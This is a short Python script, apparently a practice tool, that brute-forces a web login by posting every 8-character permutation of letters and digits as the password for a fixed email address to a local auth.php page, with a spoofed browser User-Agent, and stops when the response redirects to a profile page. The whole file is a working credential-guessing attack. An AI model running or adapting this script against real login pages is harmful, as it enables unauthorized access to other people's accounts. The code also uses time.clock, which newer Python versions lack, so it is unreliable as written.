import urllib.request, urllib.parse
import itertools, time

Nick = 'b.ujazdowski@gmail.com'
perm = "abcdefghijklmnoprstuwxyzABCDEFGHIJKLMNOPRSTUWXYZ1234567890"
combos = itertools.permutations(perm, 8) 

time_start = time.clock()

for x in combos:	
    post = urllib.parse.urlencode({'nick': Nick, 'pass': ''.join(x)})
    post = post.encode('UTF-8')
    url = urllib.request.Request('http://localhost/auth.php', post)
    url.add_header("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13")
    responseData = urllib.request.urlopen(url)
    print("Checking: ", ''.join(x))
    if responseData.geturl()== "http://localhost/profile.php":
        print("Correct password is ",''.join(x))
        break

print(u"Czas trwania łamania hasła: ", time.clock() - time_start)
